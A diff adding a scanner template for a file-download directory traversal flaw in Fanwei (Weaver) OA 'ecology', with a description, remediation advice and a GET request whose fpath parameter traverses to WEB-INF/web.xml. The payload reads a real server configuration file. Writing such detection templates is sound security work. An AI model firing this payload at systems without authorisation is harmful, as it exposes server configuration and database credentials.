@@ -1,0 +1,25 @@
+id: ecology-fileDownload-directoryTraversal
+info:
+  name: Fanwei File Download Directory Traversal
+  author:
+  - l0ne1y
+  description: |-
+    Fanwei OA Cloud Bridge Arbitrary File Read and Directory Traversal Vulnerability
+    An arbitrary file read/download vulnerability differs from website directory browsing. It not only allows traversal of files under the web directory but also browsing or downloading of files anywhere in the system. Attackers can use directory traversal attacks to obtain system files and server configuration files. Generally, attackers exploit server APIs and standard file permissions to launch attacks. An arbitrary file read/download vulnerability may exist in the web server software itself or in web applications. In this vulnerability, attackers can identify the program's runtime path from the response content and download database configuration files, making the impact clear.
+  severity: medium
+  remediation: |-
+    #### Official remediation:
+    Upgrade the system to a version without the vulnerability, or download the security patch from the official website.
+requests:
+- matchers:
+  - type: word
+    part: body
+    words:
+    - <url-pattern>/weaver/
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml'
+  method: GET
